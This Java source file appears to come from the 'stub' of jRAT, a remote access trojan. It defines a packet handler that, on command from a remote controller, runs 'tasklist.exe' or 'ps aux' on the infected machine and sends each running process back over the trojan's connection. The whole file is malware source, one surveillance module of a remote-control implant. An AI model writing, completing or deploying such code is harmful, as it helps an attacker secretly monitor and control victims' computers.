package se.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet25Process;

import com.redpois0n.oslib.OperatingSystem;


public class Packet19ListProcesses extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean icons = con.readBoolean();
		
		try {
			Process p = null;
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
			} else {
				p = Runtime.getRuntime().exec("ps aux");
			}

			if (p != null) {
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
					reader.readLine();
				}
				
				String line;

				while ((line = reader.readLine()) != null) {		
					if (line.length() > 0) {
						con.addToSendQueue(new Packet25Process(line));
					}
				}
				reader.close();
			}
		} catch (Exception err) {
			err.printStackTrace();
		}
	} 

}
